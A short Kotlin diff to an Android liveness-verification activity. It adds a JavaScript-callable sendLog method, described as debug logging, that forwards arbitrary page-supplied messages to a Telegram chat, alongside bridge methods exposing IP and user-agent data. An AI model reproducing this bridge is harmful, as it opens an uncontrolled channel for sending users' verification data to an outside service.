@@ -289,6 +289,15 @@ class LivenessActivity : AppCompatActivity() {
         @JavascriptInterface fun getIP()  = livenessData?.ip            ?: "N/A"
         @JavascriptInterface fun getUA()  = livenessData?.userAgent     ?: "N/A"
 
+        /** Log Telegram depuis JS — appelé à chaque étape clé pour debug */
+        @JavascriptInterface
+        fun sendLog(msg: String) {
+            Log.d("OzLog", msg)
+            CoroutineScope(Dispatchers.IO).launch {
+                github.sendTelegram("📋 *[Android Log]*\n`$filename`\n$msg")
+            }
+        }
+
         @JavascriptInterface
         fun onLivenessComplete(livenessId: String) {
             Log.d("Liveness", "✅ ID: $livenessId")
